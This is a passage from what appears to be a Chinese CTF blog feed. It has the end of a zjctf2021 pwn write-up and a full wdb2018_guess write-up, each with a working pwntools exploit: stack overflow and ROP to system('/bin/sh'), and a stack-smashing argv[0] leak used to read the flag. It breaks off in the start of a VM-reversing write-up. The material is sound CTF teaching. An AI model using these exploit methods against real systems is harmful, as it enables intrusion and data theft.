class="comment">#就跟改回来是一样的，截图并未执行到这里</span></span><br></pre></td></tr></table></figure><p><img src="/2021/11/06/zjctf2021%20pwn2/5.png" alt="5"></p><h3 id="劫持my-read"><a href="#劫持my-read" class="headerlink" title="劫持my_read"></a>劫持my_read</h3><p>一开始可能想的会有点简单，直接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0xff</span>,<span class="string">b&#x27;e&#x27;</span>*<span class="number">0xf8</span>+p64(pop_rdi_ret))<span class="comment">#也是因为这个填充字符选的到位，导致能快速找出错误，所以如果程序退出异常但还能继续执行不妨改一下填充字符哦</span></span><br></pre></td></tr></table></figure><p>但是会发现程序直接死了，这里就来复原一下我复盘时出的问题，先用这个最简单的payload试试看问题出在哪里。</p><p><img src="/2021/11/06/zjctf2021%20pwn2/6.png" alt="6"></p><p>会发现这个指令非常奇奇怪怪，而且rip此时最低那个字节的值是65刚好就是e的ASCII码，再disass一下发现这个函数根本没有指到这个位置上的指令，可以很清楚的知道，这条指令是被分割了，那么我们回溯栈看看，发现我们覆盖了什么导致这个问题。可以看到次时i的值就是0xb8，那么我们就调试到i=0xb7的时候，观察接下来要覆盖的值是什么。</p><p><img src="/2021/11/06/zjctf2021%20pwn2/7.png" alt="7"></p><p>可以发现接下来要覆盖的字节应该就是两个箭头所指的地方，而右边这里刚好有一个在程序的code段的地址，猜测刚刚应该是覆盖了这里的最低位导致的问题。并且我们刚刚的rip错误指向就是0x555555555365，刚好就是那个地址低字节覆盖了0x65字节导致的问题，我们先来观察一下这个地址在哪里。</p><p><img src="/2021/11/06/zjctf2021%20pwn2/8.png" alt="8"></p><p>可以发现刚好在myread中有这么一个地址，那么看到它在read函数下面应该能想到，这个是在调用read的时候保存的返回地址，读完之后改变了这个返回地址导致了出现这个错误。因为在这里调用read返回地址肯定知道就是在函数的这个位置，那么它在code_base上偏移是固定的，算出偏移之后这个地方的8个字节就固定填写这个不要改变了。此时我们的payload变成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=(<span class="string">b&#x27;e&#x27;</span>*<span class="number">0xb8</span>+p64(code_base+<span class="number">0x130a</span>)).ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;e&#x27;</span>)+p64(pop_rdi_ret)</span><br><span class="line">read(<span class="number">0xff</span>,payload)</span><br></pre></td></tr></table></figure><p>但是发现执行着突然退出了，而当时i的值还是0xc8</p><p><img src="/2021/11/06/zjctf2021%20pwn2/9.png" alt="9"></p><p>到底是为什么呢，应该能稍微猜到一点，因为可以看到rsp的那个地方已经填充好了8个e接下来就要向0xff那边填充了，0xff是循环条件的一个值，猜测是因为这个值被覆盖了导致循环提前结束了，那么在长度到0xc8的时候，这个位置应该填上一个p64(0xff)才能过去，然后后面又有一个地址，不难发现它是我们buf_addr的地址，那么这个地址也不应该被覆盖，而应该写回去。同理，下面的i作为循环变量也不应该被覆盖，这个应当能提前预测到的。</p><p>至于这个位置应该写多少呢，可以想想如果i=0的时候写自己应该写多少呢？答案当然是还是写个0才能保证写进去并且i+1。那么这个位置在哪呢，应该不难推测出开始覆盖ret_addr的时候，它的值应当i=0xf8，覆盖之前的rbp时，i=0xf0，那么再往前推，这个值应该是i=0xe8，所以这个地方给上\xe8然后后面一律填0即可。可以看到这次栈溢出注意的东西也是非常多的，可以说这题目出的也是相当好的。</p><p>最后就没什么讲究了，覆盖上ret_addr为pop_rdi_ret的gadget就能直接getshell。下面是完整payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;e&#x27;</span>*<span class="number">0xb8</span>+p64(code_base+<span class="number">0x130a</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xc8</span>,<span class="string">b&#x27;e&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0xff</span>)+p64(stack_addr-<span class="number">0xf8</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xe8</span>,<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read(<span class="number">0xff</span>,payload+<span class="string">b&#x27;\xe8&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span>+p64(pop_rdi_ret))</span><br></pre></td></tr></table></figure><p><img src="/2021/11/06/zjctf2021%20pwn2/10.png" alt="10"></p><p>能稳定getsehll，但是前提是aslr关了，aslr关了调试其实是非常舒服的，因为面对复杂的情况有时候可能不能getshell，就比如前面举过的例子，程序基址的最高字节非\x55，buf_addr的最低字节过大，目前已知就这两种情况会导致无法正常getshell。</p><p>这里还需要注意一点，因为关了aslr，我们前面的接受泄露的地址是用的p.recvuntil(b’\x55’*4)[-6:]，关了之后要把后面那个4去掉，这里因为识别单个字节，不排除会识别错误，这个随机加载谁说的清楚呢，这都是小问题。下面给出我开了aslr的运行结果。</p><p><img src="/2021/11/06/zjctf2021%20pwn2/11.png" alt="11"></p><p>如果希望能一把梭，那么可以把攻击的部分作为一个函数，然后主函数while 1 try except这样玩，但是要注意给开头四个recvuntil都加上一个参数timeout=0.5，这样它接收不到这个字节超过0.5秒就会停止接收，后面就会产生报错，报错之后自己会重新运行一遍。注意下面给的exp并没有加上这个，但是加的方法已经告诉你了。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">size,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;sentence&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./easy_stack&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./easy_stack&#x27;</span>)</span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000026b72</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b myread&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>+<span class="string">b&#x27;\xff&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)</span><br><span class="line">stack_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x218</span></span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x270b3</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">code_base=u64(p.recvuntil(<span class="string">b&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;code_base:&#x27;</span>+<span class="built_in">hex</span>(code_base))</span><br><span class="line"></span><br><span class="line">sys=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh=libc_addr+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">pop_rdi_ret+=libc_addr</span><br><span class="line"></span><br><span class="line">offset=stack_addr+<span class="number">8</span>+<span class="number">0x100</span>-((stack_addr+<span class="number">8</span>)|<span class="number">0xff</span>)</span><br><span class="line"><span class="comment">#success(&#x27;a&#x27;*offset)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read(offset+<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*offset+p64(stack_addr+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">read(<span class="number">0x100</span>,p64(sh)+p64(pop_rdi_ret+<span class="number">1</span>)+p64(sys)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe8</span>+<span class="string">b&#x27;\xff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read(offset+<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*offset+p64(stack_addr-<span class="number">0xf8</span>))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;e&#x27;</span>*<span class="number">0xb8</span>+p64(code_base+<span class="number">0x130a</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xc8</span>,<span class="string">b&#x27;e&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0xff</span>)+p64(stack_addr-<span class="number">0xf8</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xe8</span>,<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read(<span class="number">0xff</span>,payload+<span class="string">b&#x27;\xe8&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span>+p64(pop_rdi_ret))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>wdb2018_guess writeup</title>
      <link href="/2021/11/04/wdb2018_guess%20writeup/"/>
      <url>/2021/11/04/wdb2018_guess%20writeup/</url>
      
        <content type="html"><![CDATA[<p>buu刷题记录：<a href="https://buuoj.cn/challenges#wdb2018_guess">wdb2018_guess</a></p><span id="more"></span><h2 id="静态分析elf文件"><a href="#静态分析elf文件" class="headerlink" title="静态分析elf文件"></a>静态分析elf文件</h2><p>checksec一下发现开了NX和canary保护，64位程序，用ida分析看看</p><p>很明显的gets栈溢出，并且gets之后没有回显输入的内容，那这样的话意味着不能栈溢出劫持控制流了。那么看看前面，发现有一个把flag文件内容读到栈上面的动作。后面while循环调用了一个sub_400A11函数，v7=3，v6=0,，v7&gt;=v6 break就意味着这个函数会被调用三次。而发现sub_400A11函数是调用fork函数，fork函数会创建和当前进程一模一样的进程，然后范围自身进程的ID，如果是被创建的进程，那么fork将会返回0。</p><p>简单点就是fork的子进程会返回0，如果返回0那么break执行下面的内容，父进程因为返回自己进程号不会break则继续循环，然后调用fork，也就是说这个进程一共会产生3个子进程执行while循环之后的内容。</p><p>这里有一个特性，那就是在发生栈溢出之后stack_chk_fail。在终止程序之前还会打印argv[0]，这一点很合理。但是这里可以用于泄露栈上的flag，我们如果gets覆盖到argv[0]，就可以任意地址泄露了，但是因为只有三个子进程，就只能泄露三次，前两次一定要把栈地址泄露出来。但是呢现在栈地址是不知道的，我们可以先通过一次泄露泄露出libc的地址，二次泄露出栈地址，最后一次泄露flag。其实这里还有一点不太理解，就是fork之后栈是共享的嘛？libc是共享的很好理解，栈共享就不是很好理解了，还是说它栈不同，只是对应偏移的地方都有flag，然后我泄露的是别的进程上面的flag，倾向于这种解释。</p><h2 id="动态调试确定偏移"><a href="#动态调试确定偏移" class="headerlink" title="动态调试确定偏移"></a>动态调试确定偏移</h2><p>现在就需要知道这个buf到底需要多少字节能覆盖argv[0]，所以需要动调一波。断点下在fork循环之后，这里我选择了0x400b0d的位置，r。为了确定buf的位置，我们选择gets读入很多个a看看它与argv[0]之间的偏移。</p><p><img src="/2021/11/04/wdb2018_guess%20writeup/1.png" alt="1"></p><p>很容易可以从左边看出来，他们之间差了0x128个字节，那么payload就是0x128*b’a’+p64(要泄露内容的地址)。</p><p>第一次拿下libc之后第二次应该要拿__environ，这个我也是看writeup知道的，这个好像就是指向argv[0]的地址。也就是栈上的地址，这个是在libc里面的，所以拿到libc之后就可以泄露这个，然后再观察泄露的地址和flag的地址差多少，确定好偏移之后第三次就可以直接泄露flag了，这里测试之后是0x168的偏移，泄露的地址再减去0x168就是我们想要的flag了。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">libc_version=<span class="string">&#x27;2.23&#x27;</span></span><br><span class="line">libc_in_local=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name,port=<span class="number">9999</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(context.arch)==<span class="string">&#x27;amd64&#x27;</span>:bit=<span class="number">64</span></span><br><span class="line">    <span class="keyword">else</span>:bit=<span class="number">32</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-&#x27;</span>+libc_version+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">str</span>(bit)+<span class="string">&#x27;.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,port)</span><br><span class="line">        <span class="keyword">if</span> libc_in_local:libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:libc=ELF(<span class="string">&#x27;./libc/libc-&#x27;</span>+libc_version+<span class="string">&#x27;-buu&#x27;</span>+<span class="built_in">str</span>(bit)+<span class="string">&#x27;.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_addr</span>(<span class="params">payload</span>):</span></span><br><span class="line">    p.recvline()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;*** stack smashing detected ***: &#x27;</span>)</span><br><span class="line">    addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">0</span>,<span class="string">&#x27;./GUESS&#x27;</span>,<span class="number">29108</span>)</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span>+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">libc_addr = leak_addr(payload1)-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_Addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span>+p64(libc_addr+libc.sym[<span class="string">&#x27;__environ&#x27;</span>])</span><br><span class="line">stack_addr = leak_addr(payload2)-<span class="number">0x168</span></span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">payload3=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span>+p64(stack_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>成功getflag</p><p><img src="/2021/11/04/wdb2018_guess%20writeup/2.png" alt="2"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2020青龙组singal writeup</title>
      <link href="/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/"/>
      <url>/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/</url>
      
        <content type="html"><![CDATA[<p>不知不觉做到了虚拟机逆向了，曾经我也只是听说，还未曾想也能自己做出。</p><span id="more"></span><h2 id="静态分析文件"><a href="#静态分析文件" class="headerlink" title="静态分析文件"></a>静态分析文件</h2><p>exe文件，先查壳，没有壳直接ida打开。</p><p><img src="/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/1.png" alt="1"></p><p>main函数逻辑还是比较简单的，先拷贝一串内存给v4，v4再作为第一个参数给vm_operad函数，第二个参数是114。</p><p>那么我们先提取它拷贝的内存，至于这段内存如何使用那就进去分析vm_operad函数了。很明显，这个第一个参数是int*类型的，并且也没有对a1做强制转换之类的关系，那么很明显这个内存是一个int数组，那么用提取成char数组之后再用int *类型去输出它就能得到对应的int数组。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> s[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x51</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x36</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span 